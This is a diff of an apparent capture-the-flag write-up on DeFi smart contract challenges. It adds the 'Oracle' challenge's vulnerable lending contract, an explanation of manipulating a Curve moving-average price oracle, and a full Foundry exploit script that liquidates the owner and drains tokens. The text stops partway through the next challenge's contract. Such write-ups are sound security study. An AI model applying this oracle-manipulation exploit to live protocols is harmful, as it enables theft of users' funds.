@@ -806,7 +806,7 @@ contract Attack is IUniswapV2Callee {
 
 P: "UniswapV3 yield farming is so easy! Just make sure there is liquidity around the spot price. You are given 5e18 each of token0 and token1. Your goal is to get 15e18 of LP tokens."
 
-{% note(clickable=true, header="Yield.s.sol") %}
+{% note(clickable=true, header="Yield.sol") %}
 ```solidity
 // SPDX-License-Identifier: Unlicense
 
@@ -1314,6 +1314,8 @@ I suspected the following things in the protocol as the potential issues to expl
    - When the price is manipulated to extreme values, the share calculation becomes inaccurate
    - This allows us to get more LP tokens than we should for our deposit
 
+{% note(clickable=true, header="Yield.s.sol") %}
+
 ```solidity
 // SPDX-License-Identifier: Unlicense
 pragma solidity ^0.7.0;
@@ -1440,10 +1442,1401 @@ contract Attack {
     }
 }
 ```
+{%end%}
+
 The exploit takes advantage of the fact that the Yield contract doesn't properly handle extreme price movements in the underlying Uniswap V3 pool, allowing us to manipulate the LP token calculations to our advantage.
 
 
 # Oracle
 
+P: "Michael wrote a Dex pool for USDe and USDC tokens along with their respective oracles. Then he borrowed a large position from his own pool trusting his own code. The pool is deployed with the same code and params as the actual pool at https://etherscan.io/tx/0x6f4438aa1785589e2170599053a0cdc740d8987746a4b5ad9614b6ab7bb4e550. You are given 10000 tokens of USDe and USDC. Your goal is to get 20000 of USDe.
+
+Might help you: check the differences betweeen the current implementation and the implementation deployed at the pool creation time on mainnet"
+
+{% note(clickable=true, header="Oracle.sol") %}
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin-contracts-4.8.0/contracts/security/ReentrancyGuard.sol";
+import "@openzeppelin-contracts-4.8.0/contracts/access/Ownable.sol";
+import "@openzeppelin-contracts-4.8.0/contracts/utils/math/Math.sol";
+
+interface ICurve {
+    function add_liquidity(
+        uint256[] calldata amounts,
+        uint256 min_mint_amount
+    ) external returns (uint256);
+
+    function remove_liquidity_imbalance(
+        uint256[] calldata amounts,
+        uint256 max_burn_amount
+    ) external returns (uint256);
+
+    function price_oracle(uint256 idx) external view returns (uint256);
+    function last_price(uint256 idx) external view returns (uint256);
+    function coins(uint256 idx) external view returns (address);
+    function balanceOf(address owner) external view returns (uint256);
+    // function lp_token() external view returns (address);
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function exchange(
+        int128 i,
+        int128 j,
+        uint256 dx,
+        uint256 min_dy
+    ) external returns (uint256);
+}
+
+interface IPriceOracle {
+    function getAssetPrice(uint256 _assetId) external view returns (uint256);
+}
+
+contract SimplePriceOracle is IPriceOracle, Ownable {
+    uint256 public price;
+
+    constructor(uint256 _price) Ownable() {
+        price = _price;
+    }
+
+    function setPrice(uint256 _price) external onlyOwner {
+        price = _price;
+    }
+
+    function getAssetPrice(uint256 _assetId) external view returns (uint256) {
+        return price;
+    }
+}
+
+contract CurvePriceOracle is IPriceOracle {
+    address public curvePool;
+    uint256 public idx;
+
+    constructor(address _curvePool, uint256 _idx, uint256 anchor) {
+        curvePool = _curvePool;
+
+        uint256 absDiff = 0;
+        if (ICurve(curvePool).price_oracle(_idx) > anchor) {
+            absDiff = ICurve(curvePool).price_oracle(_idx) - anchor;
+        } else {
+            absDiff = anchor - ICurve(curvePool).price_oracle(_idx);
+        }
+        require(absDiff <= 1e8, "Price oracle has been manipulated :(");
+    }
+
+    function getAssetPrice(uint256 _assetId) external view returns (uint256) {
+        return ICurve(curvePool).price_oracle(idx);
+    }
+
+    function getSpotPrice() external view returns (uint256) {
+        return ICurve(curvePool).last_price(idx);
+    }
+}
+
+contract Oracle is ReentrancyGuard, Ownable {
+    struct Asset {
+        IERC20 token;
+        uint256 totalDeposited;
+        uint256 totalBorrowed;
+        uint256 baseRate;
+    }
+
+    struct UserAccount {
+        mapping(uint256 => uint256) deposited;
+        mapping(uint256 => uint256) borrowed;
+        mapping(uint256 => uint256) lastInterestBlock;
+    }
+
+    mapping(address => UserAccount) userAccounts;
+    mapping(uint256 => Asset) public assets;
+    uint256 public assetCount;
+    address public player;
+
+    uint256 public constant LIQUIDATION_CLOSE_FACTOR = 100; // 100% of the borrow can be liquidated
+    uint256 public constant PRECISION = 1e18;
+    uint256 public constant MAX_LOOPS = 10;
+    uint256 public constant BAD_DEBT_RATIO = 110;
+    uint256 public constant MIN_HEALTH_FACTOR = 1.05e18;
+
+    mapping(uint256 => address) public priceOracles;
+
+    event AssetAdded(uint256 indexed assetId, address indexed token);
+    event Deposit(address indexed user, uint256 indexed assetId, uint256 amount);
+    event Withdraw(address indexed user, uint256 indexed assetId, uint256 amount);
+    event Borrow(address indexed user, uint256 indexed assetId, uint256 amount);
+    event Repay(address indexed user, uint256 indexed assetId, uint256 amount);
+    event Liquidate(
+        address indexed liquidator,
+        address indexed borrower,
+        uint256 indexed assetId,
+        uint256 amount,
+        uint256 collateralAssetId,
+        uint256 collateralAmount
+    );
+
+    constructor(address _player) Ownable() {
+        player = _player;
+    }
+
+    function isSolved() external view returns (bool) {
+        return assets[0].token.balanceOf(address(player)) >= 20000 ether;
+    }
+
+    function getUserAccount(address user, uint256 depositAssetId, uint256 borrowAssetId, uint256 interestAssetId) external view returns (uint256, uint256, uint256) {
+        UserAccount storage account = userAccounts[user];
+        return (account.deposited[depositAssetId], account.borrowed[borrowAssetId], account.lastInterestBlock[interestAssetId]);
+    }
+
+    function addAsset(
+        address _token,
+        uint256 _baseRate
+    ) external onlyOwner {
+        assets[assetCount] = Asset({
+            token: IERC20(_token),
+            totalDeposited: 0,
+            totalBorrowed: 0,
+            baseRate: _baseRate
+        });
+        emit AssetAdded(assetCount, _token);
+        assetCount++;
+    }
+
+    function setPriceOracle(uint256 _assetId, address _priceOracle) external onlyOwner {
+        priceOracles[_assetId] = _priceOracle;
+    }
+
+    function deposit(uint256 _assetId, uint256 _amount) external nonReentrant {
+        require(_assetId < assetCount, "Invalid asset");
+        require(_amount > 0, "Amount must be greater than 0");
+
+        Asset storage asset = assets[_assetId];
+        require(asset.token.transferFrom(msg.sender, address(this), _amount), "Transfer failed");
+
+        updateInterest(msg.sender, _assetId);
+        userAccounts[msg.sender].deposited[_assetId] += _amount;
+        asset.totalDeposited += _amount;
+
+        emit Deposit(msg.sender, _assetId, _amount);
+    }
+
+    function borrow(uint256 _assetId, uint256 _amount) external nonReentrant {
+        require(_assetId < assetCount, "Invalid asset");
+        require(_amount > 0, "Amount must be greater than 0");
+
+        updateInterest(msg.sender, _assetId);
+
+        UserAccount storage account = userAccounts[msg.sender];
+        Asset storage asset = assets[_assetId];
+
+        uint256 newBorrowAmount = account.borrowed[_assetId] + _amount;
+        account.borrowed[_assetId] = newBorrowAmount;
+        asset.totalBorrowed += _amount;
+
+        uint256 healthFactor = calculateHealthFactor(msg.sender);
+        require(healthFactor >= MIN_HEALTH_FACTOR, "Borrow would result in undercollateralization");
+
+        require(asset.token.transfer(msg.sender, _amount), "Transfer failed");
+
+        emit Borrow(msg.sender, _assetId, _amount);
+    }
+
+    function liquidate(address _borrower, uint256 _assetId, uint256 _amount, uint256 _collateralAssetId)
+        external
+        nonReentrant
+    {
+        require(_assetId < assetCount && _collateralAssetId < assetCount, "Invalid asset");
+        require(_amount > 0, "Amount must be greater than 0");
+        require(_borrower != msg.sender, "Cannot liquidate own position");
+        require(_assetId != _collateralAssetId, "Cannot liquidate same asset");
+
+        updateInterest(_borrower, _assetId);
+        updateInterest(_borrower, _collateralAssetId);
+
+        UserAccount storage borrowerAccount = userAccounts[_borrower];
+        Asset storage borrowedAsset = assets[_assetId];
+        Asset storage collateralAsset = assets[_collateralAssetId];
+
+        uint256 healthFactor = calculateHealthFactor(_borrower);
+        require(healthFactor < PRECISION, "Account not liquidatable");
+
+        uint256 maxLiquidatable = borrowerAccount.borrowed[_assetId] * LIQUIDATION_CLOSE_FACTOR / 100;
+        uint256 actualLiquidation = Math.min(_amount, maxLiquidatable);
+
+        uint256 realCollateralAmount = actualLiquidation * getAssetPrice(_assetId) / getAssetPrice(_collateralAssetId);
+        uint256 collateralAmount = Math.min(realCollateralAmount, borrowerAccount.deposited[_collateralAssetId]);
+
+        uint256 toLiquidate = collateralAmount * getAssetPrice(_collateralAssetId) / getAssetPrice(_assetId);
+        if (realCollateralAmount > borrowerAccount.deposited[_collateralAssetId]) {
+            toLiquidate = toLiquidate * BAD_DEBT_RATIO / 100;
+        }
+
+        require(borrowedAsset.token.transferFrom(msg.sender, address(this), toLiquidate), "Transfer failed");
+        require(collateralAsset.token.transfer(msg.sender, collateralAmount), "Transfer failed");
+
+        borrowerAccount.borrowed[_assetId] -= actualLiquidation;
+        borrowerAccount.deposited[_collateralAssetId] -= collateralAmount;
+
+        borrowedAsset.totalBorrowed -= actualLiquidation;
+        collateralAsset.totalDeposited -= collateralAmount;
+
+        emit Liquidate(msg.sender, _borrower, _assetId, actualLiquidation, _collateralAssetId, collateralAmount);
+    }
+
+    function updateInterest(address _user, uint256 _assetId) internal {
+        UserAccount storage account = userAccounts[_user];
+        Asset storage asset = assets[_assetId];
+
+        if (account.lastInterestBlock[_assetId] == block.number) {
+            return;
+        }
+
+        uint256 interestRate = getInterestRate(_assetId);
+        uint256 blocksSinceLastUpdate = block.number - account.lastInterestBlock[_assetId];
+        uint256 interest =
+            account.borrowed[_assetId] * interestRate * blocksSinceLastUpdate / (365 days / 15) / PRECISION;
+        account.borrowed[_assetId] += interest;
+        asset.totalBorrowed += interest;
+        account.lastInterestBlock[_assetId] = block.number;
+    }
+
+    function getInterestRate(uint256 _assetId) public view returns (uint256) {
+        Asset storage asset = assets[_assetId];
+        return asset.baseRate;
+    }
+
+    function calculateHealthFactor(address _user) public view returns (uint256) {
+        uint256 totalCollateralInEth = 0;
+        uint256 totalBorrowedInEth = 0;
+
+        for (uint256 i = 0; i < assetCount; i++) {
+            Asset storage asset = assets[i];
+            UserAccount storage account = userAccounts[_user];
+
+            uint256 collateralInEth = account.deposited[i] * getAssetPrice(i);
+            uint256 borrowedInEth = account.borrowed[i] * getAssetPrice(i);
+
+            totalCollateralInEth += collateralInEth;
+            totalBorrowedInEth += borrowedInEth;
+        }
+
+        if (totalBorrowedInEth == 0) {
+            return type(uint256).max;
+        }
+
+        return totalCollateralInEth * PRECISION / totalBorrowedInEth;
+    }
+
+    function getAssetPrice(uint256 _assetId) public view returns (uint256) {
+        if (priceOracles[_assetId] == address(0)) {
+            return 0;
+        }
+        return IPriceOracle(priceOracles[_assetId]).getAssetPrice(_assetId);
+    }
+}
+```
+{%end%}
+
+## Solution
+
+An interesting chall, we got a Lending protocol which uses two different price oracles to get the asset price. 
+
+Lets, observe the protocol first, 
+
+1. **Oracle (Main Contract)**
+   - A lending protocol that allows users to deposit and borrow assets
+   - Manages multiple assets with their respective price oracles
+   - Handles liquidations and interest calculations
+   - Uses two price oracles to determine asset values for collateralization
+
+2. **SimplePriceOracle**
+   - A basic price oracle that returns a fixed price
+   - Has an owner who can set the price
+
+3. **CurvePriceOracle**
+   - More sophisticated oracle that gets prices from a Curve pool
+   - Validates price against an anchor value
+   - Can get both oracle price and spot price from the Curve pool
+
+The challenge involves manipulating these contracts to get `20,000 USDe` tokens when starting with `10,000` each of USDe and USDC. As usual let me see the initial state of this protocol,
+
+```bash
+  Player :  0xa7048127553Ead5D0408B3C8C068565d1cD46BDb
+  assetCount :  2
+  ---------------Asset0----------------
+  asset0 address:  0x21Bbb929210149d6a849caF486ee0263404056AD
+  asset0 totalDeposited0 :  10000000000000000000000
+  asset0 totalBorrowed0 :  0
+  asset0 baseRate0 :  1
+  asset0 priceOracle :  0xaabD0F52b2743ff3AF409f3f19f8626255961699
+  -----------------Asset1--------------
+  asset1 address:  0xA69af9EC4689Fad31B026c973eBf6Fc68F4c326d
+  asset1 totalDeposited1 :  10000000000
+  asset1 totalBorrowed1 :  18500000000
+  asset1 baseRate1 :  1
+  asset1 priceOracle :  0x9a99f79e1517c6ca48cA5B3A1994dB98CFECC29d
+  ---------------Owner-----------------
+  deposited0 :  10000000000000000000000
+  borrowed0 :  0
+  lastInterestedBlock0 :  3566869
+  deposited1 :  10000000000
+  borrowed1 :  18500000000
+  lastInterestedBlock1 :  3566869
+  asset0 balance :  0
+  asset1 balance :  18500000000
+
+  oracle asset0 balance :  90000000000000000000000
+  oracle asset1 balance :  71500000000
+  ---------------Player-----------------
+  deposited0 :  0
+  borrowed0 :  0
+  lastInterestedBlock0 :  0
+  deposited1 :  0
+  borrowed1 :  0
+  lastInterestedBlock1 :  0
+  asset0 balance :  10000000000000000000000
+  asset1 balance :  10000000000
+  -------------Price Oracles---------------
+  simplePriceOracle:  0xaabD0F52b2743ff3AF409f3f19f8626255961699
+  simplePriceOracle asset0 Price :  1000000
+  curvePriceOracle (asset 1):  0x9a99f79e1517c6ca48cA5B3A1994dB98CFECC29d
+  curvePriceOracle Curve Pool :  0x46206ede2b79e862D91BFa0CB4ce21EDFa7fC96f
+  Curve asset1 Price :  1000000000000000000
+  Curve SpotPrice :  1000000000000000000
+  -------------------------------------
+  token 0 in curve pool :  0x21Bbb929210149d6a849caF486ee0263404056AD
+  token 1 in curve pool :  0xA69af9EC4689Fad31B026c973eBf6Fc68F4c326d
+```
+Thats a lot of info but,  I need at least this much to understood this protocol. So, looking at the initial state we can confirm that there are only two tokens in the lending Oracle contract and also the CurvePool oracle has also have the same tokens. As per the statement those two assets are `USDe` and `USDC` and we are given with `10000` amount of tokens each.
+
+Can you guess? which one is the `USDe`? `asset0` or `asset1`?
+
+> It's asset0, cause it has the decimals of 18. USDe is 18 decimals and USDC is 6. 
+
+Owner has deposited `10000` of USDe, `10000` of USDC and borrowed `18500` of USDC. 
+
+What should we do?
+1. Can we directly `borrow()` `20000` USDe from the Oracle ? Yes If we have sufficient health factor.
+2. Can we `liquidate()` owners collatoral and get all his collatoral asset ? Yes If can make owners health factor worse. 
+
+Both of above options depends on the health factor, lets see how the health factor is calculated. 
+
+```solidity
+function calculateHealthFactor(address _user) public view returns (uint256) {
+    uint256 totalCollateralInEth = 0;
+    uint256 totalBorrowedInEth = 0;
+
+    for (uint256 i = 0; i < assetCount; i++) {
+        Asset storage asset = assets[i];
+        UserAccount storage account = userAccounts[_user];
+
+        uint256 collateralInEth = account.deposited[i] * getAssetPrice(i);
+        uint256 borrowedInEth = account.borrowed[i] * getAssetPrice(i);
+
+        totalCollateralInEth += collateralInEth;
+        totalBorrowedInEth += borrowedInEth;
+    }
+
+    if (totalBorrowedInEth == 0) {
+        return type(uint256).max;
+    }
+
+    return totalCollateralInEth * PRECISION / totalBorrowedInEth;
+}
+```
+
+Health factor is being calculated based on the asset prices, Okay lets see how the asset price is fetched.
+
+```solidity
+function getAssetPrice(uint256 _assetId) public view returns (uint256) {
+    if (priceOracles[_assetId] == address(0)) {
+        return 0;
+    }
+    return IPriceOracle(priceOracles[_assetId]).getAssetPrice(_assetId);
+}
+```
+
+Interesting, this is using different price oracles for each asset. `SimplePriceOracle` is used for asset0, and `CurvePoolOracle` is used for asset1. `SimplePriceOracle` always returns the same price meaning we can't manipulate this. But the `CurvePoolOracle` is fetching the price using `price_oracle` function of it. 
+
+We have the asset1(USDC), can we directly interact with `CurvePool` and do some deposit kind of thing these and change the price.??
+
+Yes Bro, that's is what the challenge is and that's called `ORACLE MANIPULATION` too.
+
+Let's see is that `CurvePool` is vulnerable to Oracle Manipulation or not?
+
+> There was an hint in the statement, "check the differences betweeen the current implementation and the implementation deployed at the pool creation time on mainnet"
+
+So, the `CurvePool` deployed at that time might have this kind of vulnerability. Following the traces of the transaction in given in the statement got me a `CurveStableSwapNG` **Vyper** contract. 
+
+> Now the grinding begins, I read all the documentation about this CurveStableSwapNG from here : [CurveStableSwapNG Metapool Docs](https://docs.curve.fi/stableswap-exchange/stableswap-ng/pools/metapool/#remove_liquidity). 
+
+Let me the paste the snippet that is matter to us. 
+
+```python
+@external
+@view
+@nonreentrant('lock')
+def price_oracle(i: uint256) -> uint256:
+    return self._calc_moving_average(
+        self.last_prices_packed[i],
+        self.ma_exp_time,
+        self.ma_last_time & (2**128 - 1)
+    )
+
+@external
+@nonreentrant('lock')
+def remove_liquidity_imbalance(
+    _amounts: DynArray[uint256, MAX_COINS],
+    _max_burn_amount: uint256,
+    _receiver: address = msg.sender
+) -> uint256:
+    """
+    @notice Withdraw coins from the pool in an imbalanced amount
+    @param _amounts List of amounts of underlying coins to withdraw
+    @param _max_burn_amount Maximum amount of LP token to burn in the withdrawal
+    @param _receiver Address that receives the withdrawn coins
+    @return Actual amount of the LP token burned in the withdrawal
+    """
+    amp: uint256 = self._A()
+    rates: DynArray[uint256, MAX_COINS] = self._stored_rates()
+    old_balances: DynArray[uint256, MAX_COINS] = self._balances()
+    D0: uint256 = self.get_D_mem(rates, old_balances, amp)
+    new_balances: DynArray[uint256, MAX_COINS] = old_balances
+
+    for i in range(MAX_COINS_128):
+
+        if i == N_COINS_128:
+            break
+
+        if _amounts[i] != 0:
+            new_balances[i] -= _amounts[i]
+            self._transfer_out(i, _amounts[i], _receiver)
+
+    D1: uint256 = self.get_D_mem(rates, new_balances, amp)
+    base_fee: uint256 = self.fee * N_COINS / (4 * (N_COINS - 1))
+    ys: uint256 = (D0 + D1) / N_COINS
+
+    fees: DynArray[uint256, MAX_COINS] = empty(DynArray[uint256, MAX_COINS])
+    dynamic_fee: uint256 = 0
+    xs: uint256 = 0
+    ideal_balance: uint256 = 0
+    difference: uint256 = 0
+    new_balance: uint256 = 0
+
+    for i in range(MAX_COINS_128):
+
+        if i == N_COINS_128:
+            break
+
+        ideal_balance = D1 * old_balances[i] / D0
+        difference = 0
+        new_balance = new_balances[i]
+
+        if ideal_balance > new_balance:
+            difference = ideal_balance - new_balance
+        else:
+            difference = new_balance - ideal_balance
+
+        xs = unsafe_div(rates[i] * (old_balances[i] + new_balance), PRECISION)
+        dynamic_fee = self._dynamic_fee(xs, ys, base_fee)
+        fees.append(dynamic_fee * difference / FEE_DENOMINATOR)
+
+        self.admin_balances[i] += fees[i] * admin_fee / FEE_DENOMINATOR
+        new_balances[i] -= fees[i]
+
+    D1 = self.get_D_mem(rates, new_balances, amp)  # dev: reuse D1 for new D.
+
+    self.upkeep_oracles(new_balances, amp, D1)
+
+    total_supply: uint256 = self.total_supply
+    burn_amount: uint256 = ((D0 - D1) * total_supply / D0) + 1
+    assert burn_amount > 1  # dev: zero tokens burned
+    assert burn_amount <= _max_burn_amount, "Slippage screwed you"
+
+    total_supply -= burn_amount
+    self._burnFrom(msg.sender, burn_amount)
+
+    log RemoveLiquidityImbalance(msg.sender, _amounts, fees, D1, total_supply)
+
+    return burn_amount
+```
+
+I found out that `price_oracle()` is volatile and dependent on `ma_last_time`, `ma_last_time`. And the `remove_liquidity_imbalance()` will make the pool imbalance. 
+
+Thats very interesting, let me summarize what I wanted to do here. 
+    - Increase price of asset 1 by adding liquidity and removing liquidity in different blocks
+    - and liquidate owner and get his 10000 balance of asset0 and 
+    - Borrow remaining asset 0 balance to achieve 20000 asset 0 by depositing asset 1
+
+Thats seems simple but you need to go through a lot of grinding there. 
+
+Can't explain more, just read my messy exploit script. 
+
+{% note(clickable=true, header="Oracle.s.sol") %}
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
+import "../src/Oracle.sol";
+
+contract OracleSolve is Script {
+    Oracle public oracle = Oracle(0x0F113F8Cd37DdB04c09BBf45D6fafEAa6C7b09E6);
+    address player = vm.envAddress("PLAYER");
+    SimplePriceOracle public simplePriceOracle;
+    CurvePriceOracle public curvePriceOracle;
+    ICurve public curvePool;
+
+/*
+@external
+@view
+@nonreentrant('lock')
+def price_oracle(i: uint256) -> uint256:
+    return self._calc_moving_average(
+        self.last_prices_packed[i],
+        self.ma_exp_time,
+        self.ma_last_time & (2**128 - 1)
+    )
+*/
+    function run() external{
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        simplePriceOracle = SimplePriceOracle(oracle.priceOracles(0));
+        curvePriceOracle = CurvePriceOracle(oracle.priceOracles(1)); // curvePool Oracle is for asset 1 
+        curvePool = ICurve(curvePriceOracle.curvePool());
+
+        console.log("Player : ", oracle.player());
+        console.log("assetCount : ", oracle.assetCount());
+
+        console.log("-------------------------------------");
+        (IERC20 assetToken0, uint256 totalDeposited0, uint256 totalBorrowed0, uint256 baseRate0 ) = oracle.assets(0);
+        console.log("asset0 address: ", address(assetToken0));
+        console.log("asset0 totalDeposited0 : ", totalDeposited0);
+        console.log("asset0 totalBorrowed0 : ", totalBorrowed0);
+        console.log("asset0 baseRate0 : ", baseRate0);
+        console.log("asset0 priceOracle : ", oracle.priceOracles(0));
+
+        console.log("-------------------------------------");
+        (IERC20 assetToken1, uint256 totalDeposited1, uint256 totalBorrowed1, uint256 baseRate1 ) = oracle.assets(1);
+        console.log("asset1 address: ", address(assetToken1));
+        console.log("asset1 totalDeposited1 : ", totalDeposited1);
+        console.log("asset1 totalBorrowed1 : ", totalBorrowed1);
+        console.log("asset1 baseRate1 : ", baseRate1);
+        console.log("asset1 priceOracle : ", oracle.priceOracles(1));
+        
+        console.log("---------------Owner-----------------");
+        (uint256 O_deposited0, uint256 O_borrowed0, uint256 O_lastInterestedBlock0) = oracle.getUserAccount(oracle.owner(), 0, 0 , 0);
+        console.log("deposited0 : ", O_deposited0);
+        console.log("borrowed0 : ", O_borrowed0);
+        console.log("lastInterestedBlock0 : ", O_lastInterestedBlock0);
+
+        (uint256 O_deposited1, uint256 O_borrowed1, uint256 O_lastInterestedBlock1) = oracle.getUserAccount(oracle.owner(), 1, 1 , 1);
+        console.log("deposited1 : ", O_deposited1);
+        console.log("borrowed1 : ", O_borrowed1);
+        console.log("lastInterestedBlock1 : ", O_lastInterestedBlock1);
+
+        console.log("asset0 balance : ", assetToken0.balanceOf(oracle.owner()));
+        console.log("asset1 balance : ", assetToken1.balanceOf(oracle.owner()));
+
+        console.log("oracle asset0 balance : ", assetToken0.balanceOf(address(oracle)));
+        console.log("oracle asset1 balance : ", assetToken1.balanceOf(address(oracle)));
+        
+        console.log("---------------Player-----------------");
+        (uint256 P_deposited0, uint256 P_borrowed0, uint256 P_lastInterestedBlock0) = oracle.getUserAccount(player, 0, 0 , 0);
+        console.log("deposited0 : ", P_deposited0);
+        console.log("borrowed0 : ", P_borrowed0);
+        console.log("lastInterestedBlock0 : ", P_lastInterestedBlock0);
+
+        (uint256 P_deposited1, uint256 P_borrowed1, uint256 P_lastInterestedBlock1) = oracle.getUserAccount(player, 1, 1 , 1);
+        console.log("deposited1 : ", P_deposited1);
+        console.log("borrowed1 : ", P_borrowed1);
+        console.log("lastInterestedBlock1 : ", P_lastInterestedBlock1);
+
+        console.log("asset0 balance : ", assetToken0.balanceOf(player));
+        console.log("asset1 balance : ", assetToken1.balanceOf(player));
+        
+        
+        console.log("-------------Price Oracles---------------");
+        console.log("simplePriceOracle: ", address(simplePriceOracle));
+        console.log("simplePriceOracle asset0 Price : ", simplePriceOracle.getAssetPrice(0));
+        console.log("simplePriceOracle asset1 Price : ", simplePriceOracle.getAssetPrice(1));
+
+        console.log("curvePriceOracle (asset 1): ", address(curvePriceOracle));
+        console.log("curvePriceOracle Curve Pool : ", address(curvePool));
+        console.log("Curve asset0 Price : ", curvePriceOracle.getAssetPrice(0));
+        console.log("Curve asset1 Price : ", curvePriceOracle.getAssetPrice(1)); // TARGET = 1200000000000000000
+        console.log("Curve SpotPrice : ", curvePriceOracle.getSpotPrice());
+        console.log("-------------------------------------");
+
+        console.log("token 0 in curve pool : ", curvePool.coins(0));
+        console.log("token 1 in curve pool : ", curvePool.coins(1));
+
+
+        // Goal is to reduce the price of asset 1 in the pool
+        uint256 amountOfAsset0 = assetToken0.balanceOf(player);
+        uint256 amountOfAsset1 = assetToken1.balanceOf(player);
+
+        // RUN - 1, RUN - 2
+        uint256[] memory amountsToAdd = new uint256[](2);
+        amountsToAdd[0] = amountOfAsset0/2;
+        amountsToAdd[1] = 0;
+        assetToken0.approve(address(curvePool), amountOfAsset0);
+        curvePool.add_liquidity(amountsToAdd, 0);
+        console.log("LP balance of Player : ", curvePool.balanceOf(player));
+
+        // RUN - 3
+        uint256[] memory amountsToRemove = new uint256[](2);
+        amountsToRemove[0] = 9999 ether;
+        amountsToRemove[1] = 0;
+        curvePool.approve(address(curvePool), curvePool.balanceOf(player));
+        curvePool.remove_liquidity_imbalance(amountsToRemove, curvePool.balanceOf(player));
+
+        //  RUN - 4
+        assetToken1.approve(address(oracle), amountOfAsset1);
+        oracle.liquidate(oracle.owner(), 1, amountOfAsset1, 0);
+        
+        //  RUN - 5
+        assetToken1.approve(address(oracle), amountOfAsset1);
+        oracle.deposit(1, amountOfAsset1);
+        oracle.borrow(0, 1 ether);
+
+        console.log("LP balance of Player : ", curvePool.balanceOf(player));
+        console.log("asset0 balance : ", assetToken0.balanceOf(player));
+        console.log("asset1 balance : ", assetToken1.balanceOf(player));
+
+        console.log("oracle asset0 balance : ", assetToken0.balanceOf(address(oracle)));
+        console.log("oracle asset1 balance : ", assetToken1.balanceOf(address(oracle)));
+        
+        console.log("Curve asset1 Price : ", curvePriceOracle.getAssetPrice(1)); // TARGET = 1200000000000000000
+        console.log("Curve SpotPrice : ", curvePriceOracle.getSpotPrice());
+
+        vm.stopBroadcast();
+
+    }
+}
+```
+{%end%}
+
+# Stablecoin
+
+P : 
+"""
+There is a new algorithmic stablecoin backed by ETH!
+
+Manager owner executes the following code:
+
+manager.addCollateralToken(IERC20(address(ETH)), new PriceFeed(), 20_000_000_000_000_000 ether, 1 ether);
+
+ETH.mint(address(this), 2 ether);
+ETH.approve(address(manager), type(uint256).max);
+manager.manage(ETH, 2 ether, true, 3395 ether, true);
+
+(, ERC20Signal debtToken,,,) = manager.collateralData(IERC20(address(ETH)));
+manager.updateSignal(debtToken, 3520 ether);
+You are given 6000 of ETH. Your goal is to get 50_000_000 of MIM.
+"""
+
+{% note(clickable=true, header="StableCoin.sol") %}
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
+import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
+import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
+
+library ProtocolMath {
+    uint256 internal constant ONE = 1e18;
+    uint256 internal constant MINUTES_1000_YEARS = 525_600_000;
+
+    function mulDown(uint256 a, uint256 b) internal pure returns (uint256) {
+        return (a * b) / ONE;
+    }
+
+    function divDown(uint256 a, uint256 b) internal pure returns (uint256) {
+        return (a * ONE) / b;
+    }
+
+    function divUp(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        } else {
+            return (((a * ONE) - 1) / b) + 1;
+        }
+    }
+
+    function _decMul(uint256 x, uint256 y) internal pure returns (uint256 decProd) {
+        decProd = (x * y + ONE / 2) / ONE;
+    }
+
+    function _decPow(uint256 base, uint256 exponent) internal pure returns (uint256) {
+        if (exponent == 0) {
+            return ONE;
+        }
+
+        uint256 y = ONE;
+        uint256 x = base;
+        uint256 n = Math.min(exponent, MINUTES_1000_YEARS);
+
+        while (n > 1) {
+            if (n % 2 != 0) {
+                y = _decMul(x, y);
+            }
+            x = _decMul(x, x);
+            n /= 2;
+        }
+
+        return _decMul(x, y);
+    }
+
+    function _computeHealth(uint256 collateral, uint256 debt, uint256 price) internal pure returns (uint256) {
+        return debt > 0 ? collateral * price / debt : type(uint256).max;
+    }
+}
+
+abstract contract ManagerAccess {
+    address public immutable manager;
+
+    error Unauthorized(address caller);
+
+    modifier onlyManager() {
+        if (msg.sender != manager) {
+            revert Unauthorized(msg.sender);
+        }
+        _;
+    }
+
+    constructor(address _manager) {
+        manager = _manager;
+    }
+}
+
+contract PriceFeed {
+    function fetchPrice() external pure returns (uint256, uint256) {
+        return (2207 ether, 0.01 ether);
+    }
+}
+
+contract Token is ERC20, ManagerAccess {
+    constructor(address _manager, string memory _id) ERC20(_id, _id) ManagerAccess(_manager) {}
+
+    function mint(address to, uint256 amount) external onlyManager {
+        _mint(to, amount);
+    }
+
+    function burn(address from, uint256 amount) external onlyManager {
+        _burn(from, amount);
+    }
+}
+
+contract ERC20Signal is ERC20, ManagerAccess {
+    using ProtocolMath for uint256;
+
+    uint256 public signal;
+
+    constructor(address _manager, uint256 _signal, string memory _name, string memory _symbol)
+        ERC20(_name, _symbol)
+        ManagerAccess(_manager)
+    {
+        signal = _signal;
+    }
+
+    function mint(address to, uint256 amount) external onlyManager {
+        _mint(to, amount.divUp(signal));
+    }
+
+    function burn(address from, uint256 amount) external onlyManager {
+        _burn(from, amount == type(uint256).max ? ERC20.balanceOf(from) : amount.divUp(signal));
+    }
+
+    function setSignal(uint256 backingAmount) external onlyManager {
+        uint256 supply = ERC20.totalSupply();
+        uint256 newSignal = (backingAmount == 0 && supply == 0) ? ProtocolMath.ONE : backingAmount.divUp(supply);
+        signal = newSignal;
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return ERC20.totalSupply().mulDown(signal);
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return ERC20.balanceOf(account).mulDown(signal);
+    }
+
+    function transfer(address, uint256) public pure override returns (bool) {
+        revert();
+    }
+
+    function allowance(address, address) public view virtual override returns (uint256) {
+        revert();
+    }
+
+    function approve(address, uint256) public virtual override returns (bool) {
